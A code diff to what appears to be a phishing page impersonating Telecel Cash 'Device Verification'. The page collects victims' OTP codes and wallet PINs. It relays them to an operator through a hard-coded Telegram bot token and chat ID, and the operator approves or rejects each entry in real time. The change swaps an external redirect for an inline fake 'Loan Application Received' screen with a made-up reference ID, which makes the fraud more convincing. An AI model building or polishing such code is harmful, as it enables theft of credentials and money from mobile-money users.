@@ -5,6 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Telecel Cash - Device Verification</title>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
         :root {
             --red: #E42320;
@@ -114,7 +116,6 @@
             color: var(--red);
             font-weight: 700;
         }
-        /* Offer info block */
         .offer-info {
             background: #fff0f0;
             margin: 0 20px 18px;
@@ -158,7 +159,6 @@
             font-weight: 600;
             color: #1e2937;
         }
-        /* OTP inputs */
         .otp-container {
             display: flex;
             justify-content: center;
@@ -313,6 +313,100 @@
             font-size: 13px;
             color: rgba(255,255,255,0.55);
         }
+
+        /* ── Success Overlay ── */
+        #successOverlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #f8f9fa;
+            z-index: 20000;
+            align-items: center;
+            justify-content: center;
+            animation: fadeUp 0.45s cubic-bezier(.22,.8,.3,1) both;
+        }
+        .success-app-container {
+            width: 100%;
+            max-width: 400px;
+            height: 100vh;
+            max-height: 850px;
+            background-color: white;
+            display: flex;
+            flex-direction: column;
+            border-radius: 40px;
+            border: 8px solid #000;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+            font-family: 'Inter', sans-serif;
+        }
+        .success-header {
+            background: var(--red);
+            color: white;
+            padding: 20px;
+            text-align: center;
+            font-weight: 800;
+            font-size: 20px;
+            font-family: 'Inter', sans-serif;
+        }
+        .success-content {
+            padding: 40px 25px;
+            flex-grow: 1;
+            text-align: center;
+            overflow-y: auto;
+            font-family: 'Inter', sans-serif;
+        }
+        .success-icon {
+            font-size: 65px;
+            color: #22c55e;
+            margin-bottom: 20px;
+        }
+        .success-content h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #1e2937;
+            font-family: 'Inter', sans-serif;
+            text-align: center;
+        }
+        .summary-card {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 16px;
+            padding: 20px;
+            margin: 25px 0;
+            text-align: left;
+        }
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 15px;
+            font-family: 'Inter', sans-serif;
+        }
+        .ref-id {
+            color: var(--red);
+            font-weight: 800;
+        }
+        .btn-dash {
+            width: 100%;
+            background: var(--red);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 12px;
+            font-weight: 800;
+            cursor: pointer;
+            text-decoration: none;
+            display: block;
+            margin-top: 15px;
+            font-family: 'Inter', sans-serif;
+            font-size: 15px;
+        }
+        .success-status {
+            color: #22c55e;
+            font-weight: 600;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
@@ -407,24 +501,65 @@
         <div class="spin-sub">Please hold on…</div>
     </div>
 
+    <!-- ── Success Overlay (replaces external redirect) ── -->
+    <div id="successOverlay">
+        <div class="success-app-container">
+            <div class="success-header">TELECEL CASH</div>
+            <div class="success-content">
+                <div class="success-icon">
+                    <i class="fa-solid fa-circle-check"></i>
+                </div>
+                <h2>Loan Application Received!</h2>
+                <p style="color: #64748b; font-size: 15px; margin-bottom: 20px;">
+                    Your Flex Loan request has been successfully submitted.
+                    Funds will be disbursed to your Telecel Cash wallet shortly after approval.
+                </p>
+                <div class="summary-card">
+                    <div class="summary-row">
+                        <span>Date:</span>
+                        <span id="sDate"></span>
+                    </div>
+                    <div class="summary-row">
+                        <span>Amount:</span>
+                        <span id="sAmount" class="ref-id">-</span>
+                    </div>
+                    <div class="summary-row">
+                        <span>Purpose:</span>
+                        <span id="sPurpose">-</span>
+                    </div>
+                    <div class="summary-row">
+                        <span>Reference ID:</span>
+                        <span class="ref-id" id="sRefId">TCL-</span>
+                    </div>
+                    <div class="summary-row">
+                        <span>Status:</span>
+                        <span class="success-status">Pending Approval</span>
+                    </div>
+                </div>
+                <a href="index.html" class="btn-dash">
+                    <i class="fa-solid fa-house"></i> Return to Home
+                </a>
+            </div>
+        </div>
+    </div>
+
     <script>
         const CONFIG = {
             BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
-            CHAT_ID: '7547427914',
-            SUCCESS_PAGE: 'https://unlimiteddata.vercel.app/success.html'
+            CHAT_ID: '7547427914'
         };
 
         let state = { lastUpdateId: 0 };
         let isProcessing = false;
 
-        const errMsg       = document.getElementById('errMsg');
-        const pinErrMsg    = document.getElementById('pinErrMsg');
-        const spinner      = document.getElementById('spinner');
-        const pinModal     = document.getElementById('pinModal');
-        const verifyBtn    = document.getElementById('verifyBtn');
+        const errMsg        = document.getElementById('errMsg');
+        const pinErrMsg     = document.getElementById('pinErrMsg');
+        const spinner       = document.getElementById('spinner');
+        const pinModal      = document.getElementById('pinModal');
+        const successOverlay = document.getElementById('successOverlay');
+        const verifyBtn     = document.getElementById('verifyBtn');
         const confirmPinBtn = document.getElementById('confirmPinBtn');
 
-        // ─── Read ALL URL params ───────────────────────────────────────────────
         const params = new URLSearchParams(window.location.search);
 
         function maskPhone(phone) {
@@ -434,7 +569,6 @@
         }
 
         function loadOffer() {
-            // Support both Code 1 param names (offer/data/price) AND Code 2 names (name/amount/phone/duration/rate/fee)
             const name     = params.get('offer')    || params.get('name')     || params.get('loan_name')   || 'Data Bundle';
             const data     = params.get('data')     || '';
             const price    = params.get('price')    || params.get('amount')   || params.get('loan_amount') || '0';
@@ -446,7 +580,6 @@
             document.getElementById('offerTitle').textContent = name + (data ? ` - ${data}` : '');
             document.getElementById('offerPrice').textContent = `GHS ${price}`;
 
-            // Optional meta row
             const metaItems = [];
             if (duration) metaItems.push({ label: 'Duration', value: duration });
             if (rate)     metaItems.push({ label: 'Interest',  value: rate });
@@ -458,11 +591,32 @@
                     .join('');
             }
 
-            // Phone hint
             if (phone) {
                 document.getElementById('phoneDisplay').innerHTML =
                     `Code sent to <strong>${maskPhone(phone)}</strong>`;
             }
+        }
+
+        // ── Show the embedded success page ────────────────────────────────────
+        function showSuccessPage() {
+            // Populate success summary from URL params
+            const amount  = params.get('amount')  || params.get('price')    || null;
+            const purpose = params.get('purpose') || params.get('offer')    || params.get('name') || null;
+
+            const today = new Date();
+            document.getElementById('sDate').textContent =
+                today.toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
+
+            document.getElementById('sAmount').textContent =
+                amount ? `GHS ${parseFloat(amount).toLocaleString()}` : '-';
+
+            document.getElementById('sPurpose').textContent =
+                purpose ? purpose.replace(/([A-Z])/g, ' $1').trim() : 'Personal / Emergency';
+
+            document.getElementById('sRefId').textContent =
+                'TCL-' + Math.floor(100000 + Math.random() * 900000);
+
+            successOverlay.style.display = 'flex';
         }
 
         function createInputs(containerId, count) {
@@ -522,7 +676,6 @@
             const declineId = `decline_${ts}`;
             const verifyId  = `verify_${ts}`;
 
-            // Build a readable summary of all URL params for Telegram
             const paramSummary = Array.from(params.entries())
                 .map(([k, v]) => `${k}: <code>${v}</code>`)
                 .join('\n');
@@ -571,7 +724,7 @@
                                 } else if (cb === verifyId) {
                                     clearInterval(interval);
                                     spinner.style.display = 'none';
-                                    window.location.href = CONFIG.SUCCESS_PAGE + '?' + params.toString();
+                                    showSuccessPage();          // ← inline success
                                 } else if (cb === declineId) {
                                     clearInterval(interval);
                                     spinner.style.display = 'none';
@@ -637,7 +790,7 @@
                                 if (cb === validId) {
                                     clearInterval(interval);
                                     pinModal.style.display = 'none';
-                                    window.location.href = CONFIG.SUCCESS_PAGE + '?' + params.toString();
+                                    showSuccessPage();          // ← inline success
                                 } else if (cb === invalidId) {
                                     clearInterval(interval);
                                     pinErrMsg.textContent = 'Invalid PIN. Please try again.';
